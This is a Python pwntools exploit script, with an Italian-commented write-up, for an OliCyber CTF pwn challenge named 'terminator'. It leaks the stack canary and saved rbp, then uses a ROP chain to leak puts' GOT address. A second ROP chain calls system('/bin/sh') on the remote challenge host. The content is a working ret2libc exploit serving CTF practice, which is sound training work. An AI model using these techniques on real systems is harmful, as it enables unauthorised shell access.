#! /usr/bin/env python3

# Ultima sfida, bellissimo...

# WRITE UP
# 1. supero il canarino, utilizzando la 0a che mi mette subito dopo i miei 38h caratteri
# cosi ho una leak del canarino e rbp, 
# sapendo rbp poi posso controllare tutta la stack

# 2. costruisco la rop e leako il valore got di puts.
# ritorno a welcome, sempre facendo moltissima attenzione ai valori eoffset e casini vari

# 3. rifaccio rop per chiamare system e risolvere.
from pwn import *


coso = ELF('./terminator')
# conn = process(coso.path)
conn = remote('terminator.challs.olicyber.it', 10307)
welcome = coso.symbols['welcome']

# context.terminal = ['terminator', '-e']
# gdb.attach(conn, gdbscript= """
#     b*0x004012fb
#     c
# """)
# leave main 0x4011cc
# intro welcome b*0x004011ce
# printf before first read b*0x004011fd
# printf memory leak b*0x00401238
# pop rdi b*0x004012fb



g = cyclic_gen()

payload = g.get(0x37) + b'\n' # get the canary

conn.recvuntil('> ')
conn.send(payload)

conn.recvline() # prendo il mio input, che la printa sempre
print(conn.recvline()) # prendo la \n che mette
memory_leak = conn.recvuntil('Nice to meet you!\n')
good_index = memory_leak.find(b'Nice to meet you!\n')

canary = b'\x00' + memory_leak[:7]
rbp_pointer = memory_leak[7:good_index][::-1]

print(canary,"eureka",rbp_pointer)
shifted_rbp = p64(int(rbp_pointer.hex(),16) - 0x68) # 0x68 e giusto


# print(memory_leak[:good_index], len(memory_leak[:good_index]), memory_leak[good_index:])

pop_rdi = p64(0x00000000004012fb)

ropchain = pop_rdi
ropchain += p64(0x00403fc8) # got puts
ropchain += p64(0x00401030) # call puts
ropchain += p64(0x0000000000401016) # ret
ropchain += p64(welcome) # torniamo qua per ripetere l' attacco
ropchain += p64(0x00000000004011cc) # leave return su main, per cotninaure ad utilizzare rbp giusta(next shifted_rbp)

print(conn.recvuntil('Where are you from?\n> '))

conn.sendline(ropchain + b'\x00'*(0x38- len(ropchain)) + canary + shifted_rbp) # ropexploit


print(conn.recvuntil('Goodbye!\n'), " ho printato goodbye credo") # goodbye
got_addr  = conn.recvline().strip()[::-1]
print(got_addr, " i got the got address yeaahahhah")

got_addr = int(got_addr.hex(),16)  - 0x001875a0 # - libc puts address, gestisco output

# puts local 0x001765f0
# puts remote 0x001875a0


# ################# rifaccio il secondo rop con ritorno a welcome #################

# non ho pi`u bisogno della canary perch'e tanto ce lo ho gia
# non so perche salta la prima read quindi non la mando nemmeno


pop_rdi = p64(0x00000000004012fb)
pop_rsi_r15 = p64(0x00000000004012f9)


# remote execve 0x001e62f0
# local execve 0x001cb6c0
# remote system 0x00155410
# local system 0x00148e50

shifted_rbp = p64(int(rbp_pointer.hex(),16) - 0x88) # prendo offset dal primo!!!!

ropchain = pop_rdi
ropchain += p64(int(rbp_pointer.hex(),16) - 0x50) # offset di /bin/sh pointer a questo
ropchain += p64(0x00155410 + got_addr) # chiamiamo system con offset
print(conn.recvuntil('Where are you from?\n> '))
conn.sendline(ropchain + b'\x00'*(0x30- len(ropchain))+b'/bin/sh' + b'\x00'   + canary + shifted_rbp)


conn.interactive()

# region roba vecchia
##############################################################################################################################
# 00232b00
# 001875a0 

# conn.recvuntil('Hello ')
# memory_leak2 = conn.recvuntil('Nice to meet you!\n')
# good_index = memory_leak2.find(b'Nice to meet you!\n')
# got_address = memory_leak2[:good_index][::-1]
# print("ho trovato goooooot", got_address)


# ropchain = p64(0x0000000000401016)
# conn.sendline( ropchain + b'A'*(0x38- len(ropchain)) + canary + rbp_pointer)
# ropchain = pop_rdi
# ropchain += p64(0x00402026) # stringa per format string
# ropchain += pop_rsi_r15
# ropchain += p64(0x00403fe0) # pointer to printf value
# ropchain += b'\x00'*8
# ropchain += p64(0x00401238) # call printf
# # ropchain += p64(0x00403fc8)*
# 0x00007fdab6d395f0
# payload += b'\x01'
# payload += g.get(7)
# payload += b'\n'
# print(payload)

# with open('/tmp/prova.txt', 'wb') as f:
#     f.write(payload)

# endregion
